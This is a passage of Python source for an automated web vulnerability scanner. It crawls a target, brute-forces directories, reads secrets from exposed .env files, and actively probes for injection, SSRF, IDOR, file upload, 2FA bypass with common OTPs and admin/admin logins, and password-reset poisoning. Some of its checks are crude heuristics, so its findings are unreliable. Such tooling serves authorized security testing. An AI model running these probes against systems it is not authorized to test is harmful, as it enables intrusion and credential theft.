            8443: 'https-alt', 8888: 'http-alt', 9000: 'jenkins'
        }
        
        service = port_service_map.get(port, 'unknown')
        
        banner_lower = banner.lower()
        if 'apache' in banner_lower:
            service = 'apache'
        elif 'nginx' in banner_lower:
            service = 'nginx'
        elif 'iis' in banner_lower:
            service = 'iis'
        elif 'openssh' in banner_lower:
            service = 'openssh'
        elif 'vsftpd' in banner_lower:
            service = 'vsftpd'
        elif 'postgresql' in banner_lower:
            service = 'postgresql'
        elif 'microsoft sql server' in banner_lower:
            service = 'mssql'
        elif 'redis' in banner_lower:
            service = 'redis'
        
        return service

    async def _check_port_vulnerabilities(self, port: int, service: str, banner: str) -> List[Vulnerability]:
        vulns = []
        
        if service == 'ssh':
            if 'SSH-2.0-OpenSSH' in banner:
                version_match = re.search(r'OpenSSH_(\d+\.\d+)', banner)
                if version_match:
                    version = float(version_match.group(1))
                    if version < 7.6:
                        vuln = Vulnerability(
                            title="Outdated OpenSSH Version",
                            severity="Medium",
                            description=f"OpenSSH version {version} is outdated and may contain vulnerabilities",
                            proof=f"Banner: {banner}",
                            endpoint=f"{self.base_domain}:{port}",
                            technical_detail="Older OpenSSH versions may have security issues including CVE-2018-15473, CVE-2019-16905",
                            remediation="Upgrade to OpenSSH 8.0 or later",
                            cvss_score=6.5,
                            category="Network Infrastructure"
                        )
                        vulns.append(vuln)
        
        elif service == 'ftp':
            if 'Anonymous' in banner or 'anon' in banner.lower():
                vuln = Vulnerability(
                    title="Anonymous FTP Access Enabled",
                    severity="Medium",
                    description="FTP server allows anonymous access without authentication",
                    proof=f"Banner: {banner}",
                    endpoint=f"{self.base_domain}:{port}",
                    technical_detail="Anonymous FTP can allow unauthorized file upload/download",
                    remediation="Disable anonymous FTP or restrict permissions",
                    cvss_score=5.3,
                    category="Network Infrastructure"
                )
                vulns.append(vuln)
        
        elif service in ['mysql', 'postgresql', 'mongodb', 'redis']:
            if 'auth' not in banner.lower() and 'requirepass' not in banner.lower():
                vuln = Vulnerability(
                    title="Database Without Authentication",
                    severity="Critical",
                    description=f"{service.upper()} database accessible without authentication",
                    proof=f"Banner: {banner}",
                    endpoint=f"{self.base_domain}:{port}",
                    technical_detail="Database accepts connections without requiring credentials",
                    remediation=f"Enable authentication for {service} and use strong passwords",
                    cvss_score=9.8,
                    category="Network Infrastructure"
                )
                vulns.append(vuln)
        
        elif service == 'memcached' and '11211' in banner:
            vuln = Vulnerability(
                title="Memcached UDP Reflection Enabled",
                severity="High",
                description="Memcached server with UDP support can be abused for DDoS amplification",
                proof=f"Service running on port {port}",
                endpoint=f"{self.base_domain}:{port}",
                technical_detail="Memcached can amplify traffic up to 51,000x in DDoS attacks",
                remediation="Disable UDP support or restrict access to trusted IPs",
                cvss_score=7.5,
                category="Network Infrastructure"
            )
            vulns.append(vuln)
        
        return vulns

    async def _directory_enumeration(self) -> List[str]:
        discovered = []
        
        paths_to_check = []
        for directory in self.common_dirs:
            paths_to_check.append(f"{self.target_url}/{directory}")
            paths_to_check.append(f"{self.target_url}/{directory}/")
        
        for file in self.common_files:
            paths_to_check.append(f"{self.target_url}/{file}")
        
        async def check_path(path: str):
            status, headers, text = await self._make_request(path)
            
            if status == 200:
                discovered.append(path)
                self.discovered_files.add(path)
                
                if path.endswith('.env'):
                    await self._analyze_env_file(path, text)
                elif '.git' in path:
                    await self._analyze_git_exposure(path, text)
                elif path.endswith(('.sql', '.bak', '.old', '.tar', '.zip')):
                    await self._analyze_backup_file(path, text)
            
            elif status == 403:
                discovered.append(f"{path} (403 Forbidden)")
            elif status == 401:
                discovered.append(f"{path} (401 Unauthorized)")
        
        semaphore = asyncio.Semaphore(self.max_concurrency)
        
        async def check_with_semaphore(path: str):
            async with semaphore:
                await check_path(path)
        
        tasks = [check_with_semaphore(path) for path in paths_to_check]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return discovered

    async def _analyze_env_file(self, url: str, content: str):
        sensitive_patterns = {
            'database_password': r'(?:DB_PASSWORD|DATABASE_PASSWORD|PASSWORD)\s*=\s*[\'"]([^\'"]+)[\'"]',
            'api_key': r'(?:API_KEY|SECRET_KEY|PRIVATE_KEY)\s*=\s*[\'"]([^\'"]+)[\'"]',
            'aws_key': r'(?:AWS_ACCESS_KEY|AWS_SECRET_KEY)\s*=\s*[\'"]([^\'"]+)[\'"]',
            'encryption_key': r'(?:ENCRYPTION_KEY|SECRET)\s*=\s*[\'"]([^\'"]+)[\'"]'
        }
        
        findings = []
        for key, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 5:
                    findings.append(f"{key}: {match[:10]}...")
        
        if findings:
            vuln = Vulnerability(
                title="Environment File Exposure",
                severity="Critical",
                description="Sensitive environment configuration file accessible",
                proof=f"Found .env file with: {', '.join(findings[:3])}",
                endpoint=url,
                technical_detail=".env files often contain API keys, database credentials, and configuration secrets",
                remediation="Move .env file outside web root, restrict access via .htaccess, or use environment variables",
                cvss_score=9.1,
                category="Information Disclosure"
            )
            self.vulnerabilities.append(vuln)

    async def _analyze_git_exposure(self, url: str, content: str):
        vuln = Vulnerability(
            title="Git Repository Exposure",
            severity="High",
            description="Git repository accessible via web server",
            proof=f"Git file accessible at {url}",
            endpoint=url,
            technical_detail="Exposed .git directory can reveal source code, commit history, and sensitive information",
            remediation="Add .git directory to .htaccess deny rules or remove from web root",
            cvss_score=7.5,
            category="Information Disclosure"
        )
        self.vulnerabilities.append(vuln)

    async def _analyze_backup_file(self, url: str, content: str):
        vuln = Vulnerability(
            title="Backup File Exposure",
            severity="Medium",
            description="Backup or database dump file accessible",
            proof=f"Backup file accessible at {url}",
            endpoint=url,
            technical_detail="Backup files may contain sensitive data, source code, or database contents",
            remediation="Remove backup files from web server or restrict access via authentication",
            cvss_score=5.9,
            category="Information Disclosure"
        )
        self.vulnerabilities.append(vuln)

    async def _crawl_for_endpoints(self) -> List[str]:
        endpoints = set()
        
        to_crawl = [self.target_url]
        crawled = set()
        
        max_depth = self.scan_depth
        
        async def crawl_page(url: str, depth: int):
            if depth > max_depth or url in crawled:
                return
            
            crawled.add(url)
            
            try:
                status, headers, text = await self._make_request(url)
                
                if status == 200:
                    endpoints.add(url)
                    
                    links = self._extract_links(text, url)
                    
                    for link in links:
                        if link not in crawled and self._is_same_domain(link):
                            if depth < max_depth:
                                to_crawl.append((link, depth + 1))
                    
                    forms = self._extract_forms(text, url)
                    for form in forms:
                        endpoints.add(form['action'])
                        await self._test_form_vulnerabilities(form, url)
                    
                    js_endpoints = self._extract_js_endpoints(text, url)
                    endpoints.update(js_endpoints)
                    
                    api_patterns = ['/api/', '/graphql', '/rest/', '/v1/', '/v2/']
                    for pattern in api_patterns:
                        if pattern in url:
                            self.discovered_apis.add(url)
                            await self._test_api_security(url)
            except:
                pass
        
        current_depth = 0
        while to_crawl and current_depth < max_depth:
            batch = []
            while to_crawl and len(batch) < self.max_concurrency:
                item = to_crawl.pop(0)
                if isinstance(item, tuple):
                    url, depth = item
                else:
                    url, depth = item, 0
                batch.append(crawl_page(url, depth))
            
            if batch:
                await asyncio.gather(*batch, return_exceptions=True)
            
            current_depth += 1
        
        return list(endpoints)

    def _extract_links(self, html_content: str, base_url: str) -> List[str]:
        links = set()
        
        href_pattern = r'href=["\']([^"\']+)["\']'
        src_pattern = r'src=["\']([^"\']+)["\']'
        
        for pattern in [href_pattern, src_pattern]:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if match.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                    continue
                
                full_url = urljoin(base_url, match)
                
                if self._is_same_domain(full_url):
                    links.add(full_url)
        
        return list(links)

    def _extract_forms(self, html_content: str, base_url: str) -> List[Dict]:
        forms = []
        
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        matches = re.findall(form_pattern, html_content, re.IGNORECASE | re.DOTALL)
        
        for action, form_content in matches:
            form = {
                'action': urljoin(base_url, action) if action else base_url,
                'method': 'POST',
                'inputs': []
            }
            
            method_match = re.search(r'method=["\']([^"\']+)["\']', form_content, re.IGNORECASE)
            if method_match:
                form['method'] = method_match.group(1).upper()
            
            input_pattern = r'<(?:input|textarea|select)[^>]*name=["\']([^"\']+)["\'][^>]*>'
            input_matches = re.findall(input_pattern, form_content, re.IGNORECASE)
            
            for input_name in input_matches:
                if input_name not in ['submit', 'button', 'reset']:
                    form['inputs'].append(input_name)
            
            forms.append(form)
        
        return forms

    def _extract_js_endpoints(self, html_content: str, base_url: str) -> Set[str]:
        endpoints = set()
        
        patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'\.ajax\([^)]*url:\s*["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self._is_same_domain(full_url):
                    endpoints.add(full_url)
        
        return endpoints

    def _is_same_domain(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.netloc.endswith(self.base_domain) or self.base_domain.endswith(parsed.netloc)
        except:
            return False

    async def _test_form_vulnerabilities(self, form: Dict, page_url: str):
        if form['method'] in ['GET', 'POST']:
            for input_field in form['inputs']:
                if any(keyword in input_field.lower() for keyword in ['id', 'user', 'name', 'query', 'search']):
                    await self._test_sql_injection(form, input_field, page_url)
        
        for input_field in form['inputs']:
            if any(keyword in input_field.lower() for keyword in ['name', 'comment', 'message', 'search', 'query']):
                await self._test_xss(form, input_field, page_url)

    async def _test_sql_injection(self, form: Dict, input_field: str, page_url: str):
        for payload in self.sql_payloads[:5]:
            data = {}
            for field in form['inputs']:
                if field == input_field:
                    data[field] = payload
                else:
                    data[field] = f"test_{field}"
            
            status, headers, text = await self._make_request(
                form['action'],
                method=form['method'],
                data=data
            )
            
            sql_errors = [
                "sql syntax",
                "mysql_fetch",
                "mysql_num_rows",
                "you have an error in your sql",
                "unclosed quotation mark",
                "warning: mysql",
                "postgresql",
                "ora-",
                "sqlite",
                "odbc",
                "jdbc",
                "driver",
                "syntax error"
            ]
            
            text_lower = text.lower()
            for error in sql_errors:
                if error in text_lower:
                    vuln = Vulnerability(
                        title="SQL Injection Vulnerability",
                        severity="Critical",
                        description=f"SQL injection possible in {input_field} parameter",
                        proof=f"Error response with payload: {payload}",
                        endpoint=form['action'],
                        technical_detail=f"Parameter {input_field} is vulnerable to SQL injection. Database error returned.",
                        remediation="Use parameterized queries/prepared statements, input validation, and ORM",
                        cvss_score=9.8,
                        category="Injection"
                    )
                    self.vulnerabilities.append(vuln)
                    return

    async def _test_xss(self, form: Dict, input_field: str, page_url: str):
        for payload in self.xss_payloads[:3]:
            data = {}
            for field in form['inputs']:
                if field == input_field:
                    data[field] = payload
                else:
                    data[field] = f"test_{field}"
            
            status, headers, text = await self._make_request(
                form['action'],
                method=form['method'],
                data=data
            )
            
            if payload in text:
                vuln = Vulnerability(
                    title="Reflected Cross-Site Scripting (XSS)",
                    severity="Medium",
                    description=f"XSS possible in {input_field} parameter",
                    proof=f"Payload reflected in response: {payload[:50]}...",
                    endpoint=form['action'],
                    technical_detail=f"Parameter {input_field} reflects user input without proper encoding",
                    remediation="Implement output encoding, Content Security Policy (CSP), and input validation",
                    cvss_score=6.1,
                    category="XSS"
                )
                self.vulnerabilities.append(vuln)
                break

    async def _test_api_security(self, api_url: str):
        status, headers, text = await self._make_request(api_url)
        if status in [200, 201] and '401' not in text and '403' not in text:
            vuln = Vulnerability(
                title="API Endpoint Without Authentication",
                severity="High",
                description="API endpoint accessible without authentication",
                proof=f"Endpoint returns {status} without authentication",
                endpoint=api_url,
                technical_detail="API endpoint does not require authentication, allowing unauthorized access",
                remediation="Implement API key, JWT, OAuth, or other authentication mechanism",
                cvss_score=8.6,
                category="API Security"
            )
            self.vulnerabilities.append(vuln)
        
        error_payloads = ["'", "\"", "{{", "}}", "../../", "|"]
        for payload in error_payloads:
            test_url = f"{api_url}?test={payload}"
            status, headers, text = await self._make_request(test_url)
            
            if any(word in text.lower() for word in ['error', 'exception', 'traceback', 'stack trace', 'at line']):
                if len(text) < 10000:
                    vuln = Vulnerability(
                        title="Verbose Error Messages in API",
                        severity="Low",
                        description="API returns verbose error messages",
                        proof=f"Error details returned with payload: {payload}",
                        endpoint=api_url,
                        technical_detail="Detailed error messages can reveal implementation details",
                        remediation="Implement generic error messages in production",
                        cvss_score=3.7,
                        category="Information Disclosure"
                    )
                    self.vulnerabilities.append(vuln)
                    break

    async def _test_path_traversal(self):
        file_patterns = ['file=', 'document=', 'path=', 'image=', 'doc=']
        
        for url in list(self.discovered_files)[:10]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in file_patterns:
                if pattern in query.lower():
                    for payload in self.path_traversal_payloads[:3]:
                        modified_query = re.sub(
                            rf'({pattern})([^&]+)',
                            rf'\g<1>{payload}',
                            query,
                            flags=re.IGNORECASE
                        )
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                        
                        status, headers, text = await self._make_request(test_url)
                        
                        if status == 200 and any(indicator in text.lower() for indicator in ['root:', 'daemon:', 'bin/', 'etc/passwd', '[boot loader]']):
                            vuln = Vulnerability(
                                title="Path Traversal Vulnerability",
                                severity="High",
                                description="Directory traversal possible in file parameter",
                                proof=f"Able to read system files with payload: {payload}",
                                endpoint=url,
                                technical_detail="Lack of input validation allows accessing files outside web root",
                                remediation="Validate file paths, use whitelists, and implement proper file access controls",
                                cvss_score=7.5,
                                category="File Handling"
                            )
                            self.vulnerabilities.append(vuln)
                            break

    async def _test_command_injection(self):
        cmd_patterns = ['cmd=', 'command=', 'exec=', 'ping=', 'ip=']
        
        for url in list(self.discovered_urls)[:10]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in cmd_patterns:
                if pattern in query.lower():
                    for payload in self.command_payloads[:3]:
                        modified_query = re.sub(
                            rf'({pattern})([^&]+)',
                            rf'\g<1>{payload}',
                            query,
                            flags=re.IGNORECASE
                        )
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                        
                        status, headers, text = await self._make_request(test_url)
                        
                        if status == 200 and any(indicator in text.lower() for indicator in ['uid=', 'gid=', 'root', 'total ', 'bytes from']):
                            vuln = Vulnerability(
                                title="Command Injection Vulnerability",
                                severity="Critical",
                                description="Command injection possible in parameter",
                                proof=f"Command execution detected with payload: {payload}",
                                endpoint=url,
                                technical_detail="User input passed directly to system() or exec() functions",
                                remediation="Use safe APIs, input validation, and avoid shell command execution with user input",
                                cvss_score=9.8,
                                category="Injection"
                            )
                            self.vulnerabilities.append(vuln)
                            break

    async def _test_nosql_injection(self):
        nosql_patterns = ['query=', 'filter=', 'search=', 'find=', 'where=']
        
        for url in list(self.discovered_apis)[:5]:
            for payload in self.nosql_payloads[:3]:
                try:
                    status, headers, text = await self._make_request(
                        url,
                        method='POST',
                        json_data=json.loads(payload) if payload.startswith('{') else {'query': payload}
                    )
                    
                    if status in [200, 201]:
                        if 'error' not in text.lower() or 'true' in text.lower() or payload.strip('{}"\'') in text:
                            vuln = Vulnerability(
                                title="NoSQL Injection Vulnerability",
                                severity="High",
                                description="NoSQL injection possible in API endpoint",
                                proof=f"Successful query manipulation with payload: {payload[:50]}...",
                                endpoint=url,
                                technical_detail="User input passed directly to NoSQL query operators",
                                remediation="Use parameterized queries, input validation, and avoid passing user input directly to query builders",
                                cvss_score=8.5,
                                category="Injection"
                            )
                            self.vulnerabilities.append(vuln)
                            break
                except:
                    continue

    async def _test_ssti(self):
        ssti_patterns = ['template=', 'view=', 'page=', 'name=', 'file=']
        
        for url in list(self.discovered_urls)[:10]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in ssti_patterns:
                if pattern in query.lower():
                    for payload in self.ssti_payloads[:3]:
                        modified_query = re.sub(
                            rf'({pattern})([^&]+)',
                            rf'\g<1>{payload}',
                            query,
                            flags=re.IGNORECASE
                        )
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                        
                        status, headers, text = await self._make_request(test_url)
                        
                        if status == 200 and ('49' in text or '7*7' in text or 'system' in text):
                            vuln = Vulnerability(
                                title="Server-Side Template Injection (SSTI)",
                                severity="Critical",
                                description="Template injection possible in parameter",
                                proof=f"Template execution detected with payload: {payload}",
                                endpoint=url,
                                technical_detail="User input passed directly to template engine",
                                remediation="Use sandboxed template engines, input validation, and avoid user input in templates",
                                cvss_score=9.0,
                                category="Injection"
                            )
                            self.vulnerabilities.append(vuln)
                            break

    async def _test_xxe(self):
        xml_endpoints = []
        
        for url in list(self.discovered_apis)[:5]:
            if any(xml_indicator in url.lower() for xml_indicator in ['xml', 'soap', 'rss', 'feed', 'wsdl']):
                xml_endpoints.append(url)
        
        for url in xml_endpoints:
            for payload in self.xxe_payloads[:2]:
                headers = {'Content-Type': 'application/xml'}
                status, headers, text = await self._make_request(
                    url,
                    method='POST',
                    data=payload,
                    headers=headers
                )
                
                if status == 200 and ('root:' in text.lower() or 'daemon:' in text.lower() or '/etc/passwd' in text):
                    vuln = Vulnerability(
                        title="XML External Entity (XXE) Injection",
                        severity="Critical",
                        description="XXE injection possible in XML endpoint",
                        proof=f"External entity resolution detected with payload",
                        endpoint=url,
                        technical_detail="XML parser resolves external entities allowing file read or SSRF",
                        remediation="Disable external entity resolution in XML parser, use safer XML libraries",
                        cvss_score=9.3,
                        category="Injection"
                    )
                    self.vulnerabilities.append(vuln)
                    break

    async def _test_crlf_injection(self):
        crlf_patterns = ['url=', 'redirect=', 'return=', 'next=', 'path=']
        
        for url in list(self.discovered_urls)[:10]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in crlf_patterns:
                if pattern in query.lower():
                    for payload in self.crlf_payloads[:2]:
                        modified_query = re.sub(
                            rf'({pattern})([^&]+)',
                            rf'\g<1>{payload}',
                            query,
                            flags=re.IGNORECASE
                        )
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                        
                        status, headers, text = await self._make_request(test_url)
                        
                        if 'injected' in str(headers).lower() or 'malicious' in str(headers).lower():
                            vuln = Vulnerability(
                                title="CRLF Injection Vulnerability",
                                severity="Medium",
                                description="CRLF injection possible in parameter",
                                proof=f"Header injection detected with payload: {payload}",
                                endpoint=url,
                                technical_detail="User input allows injecting CRLF sequences into HTTP headers",
                                remediation="Validate and sanitize URL parameters, encode special characters",
                                cvss_score=6.5,
                                category="Injection"
                            )
                            self.vulnerabilities.append(vuln)
                            break

    async def _test_jwt_security(self):
        jwt_patterns = ['token=', 'auth=', 'jwt=', 'access_token=', 'bearer=']
        
        for url in list(self.discovered_apis)[:5]:
            for pattern in jwt_patterns:
                for payload in self.jwt_payloads[:2]:
                    test_url = f"{url}?{pattern}{payload}"
                    status, headers, text = await self._make_request(test_url)
                    
                    if status == 200 and 'admin' in text.lower():
                        vuln = Vulnerability(
                            title="JWT Security Bypass",
                            severity="High",
                            description="JWT token validation bypass possible",
                            proof=f"Admin access achieved with modified JWT: {payload[:50]}...",
                            endpoint=url,
                            technical_detail="JWT accepts 'none' algorithm or weak signature verification",
                            remediation="Validate JWT signatures, reject 'none' algorithm, use strong secrets",
                            cvss_score=8.2,
                            category="Authentication"
                        )
                        self.vulnerabilities.append(vuln)
                        break

    async def _test_graphql_security(self):
        graphql_endpoints = [url for url in self.discovered_apis if 'graphql' in url.lower()]
        
        for url in graphql_endpoints:
            for payload in self.graphql_payloads[:2]:
                status, headers, text = await self._make_request(
                    url,
                    method='POST',
                    json_data={'query': payload}
                )
                
                if status == 200 and ('__schema' in text or '__typename' in text or 'email' in text):
                    vuln = Vulnerability(
                        title="GraphQL Information Disclosure",
                        severity="Medium",
                        description="GraphQL introspection enabled or excessive data exposure",
                        proof=f"Schema or data exposed with query: {payload[:50]}...",
                        endpoint=url,
                        technical_detail="GraphQL introspection exposes API schema, potentially revealing sensitive operations",
                        remediation="Disable introspection in production, implement query depth limiting, add rate limiting",
                        cvss_score=5.9,
                        category="API Security"
                    )
                    self.vulnerabilities.append(vuln)
                    break

    async def _test_ssrf(self):
        ssrf_patterns = ['url=', 'image=', 'proxy=', 'load=', 'fetch=']
        
        for url in list(self.discovered_urls)[:10]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in ssrf_patterns:
                if pattern in query.lower():
                    for payload in self.ssrf_payloads[:3]:
                        modified_query = re.sub(
                            rf'({pattern})([^&]+)',
                            rf'\g<1>{payload}',
                            query,
                            flags=re.IGNORECASE
                        )
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                        
                        status, headers, text = await self._make_request(test_url)
                        
                        if status in [200, 500] and any(indicator in text.lower() for indicator in ['ec2', 'metadata', '169.254', 'localhost']):
                            vuln = Vulnerability(
                                title="Server-Side Request Forgery (SSRF)",
                                severity="High",
                                description="SSRF possible in parameter",
                                proof=f"Internal request detected with payload: {payload}",
                                endpoint=url,
                                technical_detail="Application makes requests to user-supplied URLs without validation",
                                remediation="Validate and whitelist URL destinations, use URL parsers that prevent internal network access",
                                cvss_score=8.2,
                                category="Server Security"
                            )
                            self.vulnerabilities.append(vuln)
                            break

    async def _test_idor(self):
        id_patterns = ['id=', 'user=', 'account=', 'order=', 'invoice=']
        
        for url in list(self.discovered_urls)[:15]:
            parsed = urlparse(url)
            query = parsed.query
            
            for pattern in id_patterns:
                if pattern in query.lower():
                    test_ids = ['1', '2', '100', 'admin', '0']
                    original_value = re.search(rf'{pattern}([^&]+)', query, re.IGNORECASE)
                    
                    if original_value:
                        original_id = original_value.group(1)
                        
                        for test_id in test_ids:
                            if test_id != original_id:
                                modified_query = query.replace(f"{pattern}{original_id}", f"{pattern}{test_id}")
                                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
                                
                                status, headers, text = await self._make_request(test_url)
                                
                                if status == 200 and len(text) > 100:
                                    vuln = Vulnerability(
                                        title="Insecure Direct Object Reference (IDOR)",
                                        severity="High",
                                        description="IDOR vulnerability allows accessing other users' data",
                                        proof=f"Access to object {test_id} with user-supplied ID",
                                        endpoint=url,
                                        technical_detail="Object references are exposed without authorization checks",
                                        remediation="Implement proper authorization checks, use indirect references, or UUIDs",
                                        cvss_score=7.5,
                                        category="Authorization"
                                    )
                                    self.vulnerabilities.append(vuln)
                                    return

    async def _test_file_upload(self):
        upload_endpoints = []
        
        for url in self.discovered_urls:
            if any(upload_word in url.lower() for upload_word in ['upload', 'file', 'image', 'attach', 'import']):
                upload_endpoints.append(url)
        
        for url in upload_endpoints[:3]:
            test_files = [
                ('test.php', b'<?php echo "test"; ?>', 'application/x-php'),
                ('test.jpg.php', b'<?php echo "test"; ?>', 'image/jpeg'),
                ('test.png', b'PNG\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php echo "test"; ?>', 'image/png')
            ]
            
            for filename, content, content_type in test_files:
                data = aiohttp.FormData()
                data.add_field('file', content, filename=filename, content_type=content_type)
                
                status, headers, text = await self._make_request(
                    url,
                    method='POST',
                    data=data
                )
                
                if status in [200, 201] and ('uploaded' in text.lower() or 'success' in text.lower()):
                    vuln = Vulnerability(
                        title="Unrestricted File Upload",
                        severity="Critical",
                        description="File upload allows dangerous file types",
                        proof=f"Uploaded {filename} with PHP content",
                        endpoint=url,
                        technical_detail="File upload accepts executable files without proper validation",
                        remediation="Validate file extensions, MIME types, and content; store files outside web root; use antivirus scanning",
                        cvss_score=9.0,
                        category="File Handling"
                    )
                    self.vulnerabilities.append(vuln)
                    break

    async def _test_csp_misconfig(self):
        status, headers, text = await self._make_request(self.target_url)
        
        if 'content-security-policy' in headers:
            csp = headers['content-security-policy'].lower()
            
            if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
                vuln = Vulnerability(
                    title="Weak Content Security Policy (CSP)",
                    severity="Medium",
                    description="CSP contains unsafe directives",
                    proof=f"CSP allows unsafe-inline or unsafe-eval: {csp[:100]}...",
                    endpoint=self.target_url,
                    technical_detail="CSP with unsafe directives reduces effectiveness against XSS",
                    remediation="Remove unsafe-inline and unsafe-eval directives, use nonces or hashes for inline scripts",
                    cvss_score=5.5,
                    category="Client-Side Security"
                )
                self.vulnerabilities.append(vuln)
            
            if "'self'" in csp and "http:" in csp:
                vuln = Vulnerability(
                    title="Mixed Content in CSP",
                    severity="Low",
                    description="CSP allows mixed HTTP/HTTPS content",
                    proof=f"CSP allows HTTP content: {csp[:100]}...",
                    endpoint=self.target_url,
                    technical_detail="CSP that allows HTTP resources enables MITM attacks",
                    remediation="Use HTTPS-only resources in CSP, upgrade-insecure-requests directive",
                    cvss_score=4.0,
                    category="Client-Side Security"
                )
                self.vulnerabilities.append(vuln)

    async def _test_cookie_security(self):
        status, headers, text = await self._make_request(self.target_url)
        
        if 'set-cookie' in headers:
            cookies = headers['set-cookie'].split(', ')
            
            for cookie in cookies:
                cookie_lower = cookie.lower()
                
                if 'httponly' not in cookie_lower:
                    vuln = Vulnerability(
                        title="Cookie Missing HttpOnly Flag",
                        severity="Medium",
                        description="Session cookie accessible to JavaScript",
                        proof=f"Cookie without HttpOnly: {cookie[:50]}...",
                        endpoint=self.target_url,
                        technical_detail="Cookies without HttpOnly flag are accessible to JavaScript, increasing XSS impact",
                        remediation="Add HttpOnly flag to all session cookies",
                        cvss_score=5.9,
                        category="Session Security"
                    )
                    self.vulnerabilities.append(vuln)
                
                if 'secure' not in cookie_lower and self.scheme == 'https':
                    vuln = Vulnerability(
                        title="Cookie Missing Secure Flag",
                        severity="Medium",
                        description="Cookie transmitted over HTTP on HTTPS site",
                        proof=f"Cookie without Secure flag: {cookie[:50]}...",
                        endpoint=self.target_url,
                        technical_detail="Cookies without Secure flag can be intercepted over HTTP",
                        remediation="Add Secure flag to all cookies on HTTPS sites",
                        cvss_score=6.1,
                        category="Session Security"
                    )
                    self.vulnerabilities.append(vuln)
                
                if 'samesite' not in cookie_lower:
                    vuln = Vulnerability(
                        title="Cookie Missing SameSite Attribute",
                        severity="Low",
                        description="Cookie vulnerable to CSRF attacks",
                        proof=f"Cookie without SameSite: {cookie[:50]}...",
                        endpoint=self.target_url,
                        technical_detail="Cookies without SameSite attribute are vulnerable to CSRF attacks",
                        remediation="Add SameSite=Lax or SameSite=Strict to cookies",
                        cvss_score=4.3,
                        category="Session Security"
                    )
                    self.vulnerabilities.append(vuln)

    async def _test_rate_limiting(self):
        test_endpoints = []
        
        for url in self.discovered_urls:
            if any(auth_word in url.lower() for auth_word in ['login', 'auth', 'signin', 'register', 'password']):
                test_endpoints.append(url)
        
        for url in test_endpoints[:3]:
            requests = []
            for i in range(15):
                status, headers, text = await self._make_request(url)
                requests.append(status)
            
            success_count = sum(1 for status in requests if status in [200, 201, 302])
            
            if success_count == 15:
                vuln = Vulnerability(
                    title="Missing Rate Limiting",
                    severity="Medium",
                    description="No rate limiting on authentication endpoint",
                    proof=f"15 consecutive requests succeeded to {url}",
                    endpoint=url,
                    technical_detail="Missing rate limiting allows brute force attacks and denial of service",
                    remediation="Implement rate limiting, CAPTCHA, or exponential backoff",
                    cvss_score=5.5,
                    category="Authentication"
                )
                self.vulnerabilities.append(vuln)

    async def test_2fa_bypass(self, login_url: str) -> List[Vulnerability]:
        vulns = []
        
        test_cases = [
            {'otp': '000000', 'description': 'Default OTP'},
            {'otp': '123456', 'description': 'Common OTP'},
            {'otp': '111111', 'description': 'Repeating digits'},
            {'otp': '', 'description': 'Empty OTP'},
            {'otp': None, 'description': 'Null OTP'},
            {'remember_device': True, 'description': 'Remember device'},
            {'trust_device': True, 'description': 'Trust device'}
        ]
        
        for test in test_cases:
            data = {'username': 'admin', 'password': 'admin'}
            data.update(test)
            
            status, headers, text = await self._make_request(
                login_url,
                method='POST',
                data=data
            )
            
            if status in [200, 302] and any(indicator in text.lower() for indicator in ['dashboard', 'welcome', 'success']):
                vuln = Vulnerability(
                    title="2FA/MFA Bypass Vulnerability",
                    severity="Critical",
                    description=f"2FA bypass possible using {test['description']}",
                    proof=f"Successfully logged in with {test}",
                    endpoint=login_url,
                    technical_detail="Multi-factor authentication can be bypassed using common OTPs or device trust features",
                    remediation="Implement proper 2FA with secure random codes, enforce device verification, and monitor for bypass attempts",
                    cvss_score=9.1,
                    category="Authentication"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_password_reset_poisoning(self, reset_url: str) -> List[Vulnerability]:
        vulns = []
        
        poisoned_emails = self.auth_payloads['password_reset']
        
        for email in poisoned_emails:
            data = {'email': email}
            
            status, headers, text = await self._make_request(
                reset_url,
                method='POST',
                data=data
            )
            
            if status == 200 and any(word in text.lower() for word in ['sent', 'email', 'check', 'reset']):
                vuln = Vulnerability(
                    title="Password Reset Poisoning",
                    severity="High",
                    description="Password reset can be poisoned to send to attacker",
                    proof=f"Reset email accepted for: {email}",
                    endpoint=reset_url,
                    technical_detail="Password reset token sent to attacker-controlled email or parameter injection possible",
                    remediation="Validate email domains, implement rate limiting, and use secure reset tokens",
                    cvss_score=7.5,
                    category="Authentication"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_session_fixation(self, login_url: str) -> List[Vulnerability]:
        vulns = []
        
        session_cookie = f"SESSIONID={secrets.token_hex(32)}"
        
        headers = {'Cookie': session_cookie}
        status, headers, text = await self._make_request(
            login_url,
            headers=headers
        )
        
        data = {'username': 'test', 'password': 'test'}
        status, headers, text = await self._make_request(
            login_url,
            method='POST',
            data=data,
            headers=headers
        )
        
        if 'Set-Cookie' in headers and 'SESSIONID' not in headers['Set-Cookie']:
            vuln = Vulnerability(
